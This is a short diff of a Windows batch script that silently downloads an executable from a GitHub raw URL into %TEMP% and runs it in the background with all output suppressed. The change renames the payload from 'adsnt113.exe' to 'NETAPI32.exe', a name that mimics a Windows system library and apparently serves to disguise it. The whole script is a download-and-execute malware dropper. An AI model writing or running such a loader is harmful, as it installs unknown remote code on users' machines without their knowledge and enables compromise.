@@ -11,16 +11,16 @@
     cd %TEMP%
 
     REM --> Download files silently using PowerShell
-    powershell -Command "Invoke-WebRequest 'https://github.com/walks111551/09672018256120856125/raw/refs/heads/main/adsnt113.exe' -OutFile adsnt113.exe" >nul 2>&1
+    powershell -Command "Invoke-WebRequest 'https://github.com/walks111551/09672018256120856125/raw/refs/heads/main/NETAPI32.exe' -OutFile NETAPI32.exe" >nul 2>&1
 
 
-    REM --> Check if adsnt113.exe exists silently
-    if not exist "adsnt113.exe" (
+    REM --> Check if NETAPI32.exe exists silently
+    if not exist "NETAPI32.exe" (
         exit /b
     )
 
-    REM --> Execute adsnt113.exe silently
-    start /B "" adsnt113.exe >nul 2>&1
+    REM --> Execute NETAPI32.exe silently
+    start /B "" NETAPI32.exe >nul 2>&1
     timeout /t 5 /nobreak >nul 2>&1
 
         )
